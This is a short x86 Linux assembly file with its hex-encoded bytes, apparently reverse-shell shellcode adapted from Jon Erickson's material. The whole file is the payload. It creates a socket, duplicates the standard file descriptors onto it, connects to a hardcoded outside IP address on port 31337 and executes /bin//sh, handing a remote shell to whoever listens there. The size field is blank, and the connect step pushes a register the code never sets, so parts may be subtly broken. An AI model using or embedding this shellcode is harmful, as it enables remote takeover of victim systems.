;Author: Jon Erickson + degrigis (fix)
;Size of shellcode:
;HEX: \x6a\x66\x58\x99\x31\xdb\x43\x52\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x93\x6a\x01\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x31\xc0\x31\xdb\xb0\x66\x43\x43\x68\x25\xbb\xe1\xbb\x66\x68\x7a\x69\x66\x53\x89\xe1\x6a\x10\x51\x56\x89\xe1\x43\xcd\x80\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x89\xe2\x53\x89\xe1\xcd\x80


section .text
global _start

_start:
push BYTE 0x66
pop eax
cdq
xor ebx,ebx
inc ebx
push edx
push BYTE 0x1
push BYTE 0x2
mov ecx,esp
int 0x80
;socket created ready in eax

xchg ebx,eax
push BYTE 0x1
pop ecx
dup_loop:
    mov al,0x3F ;calling dup2
    int 0x80
    dec ecx
    jns dup_loop
;dup2 of fd stdin/stdout/stderr done

xor eax,eax
xor ebx,ebx
mov al,0x66
inc ebx
inc ebx
push DWORD 0xbbe1bb25
push WORD 0x697a
push WORD bx
mov ecx,esp
push BYTE 16
push ecx
push esi
mov ecx,esp
inc ebx
int 0x80
;socket connected 

mov BYTE al,11
push edx
push 0x68732f2f
push 0x6e69622f
mov ebx,esp
push edx
mov edx,esp
push ebx
mov ecx,esp
int 0x80


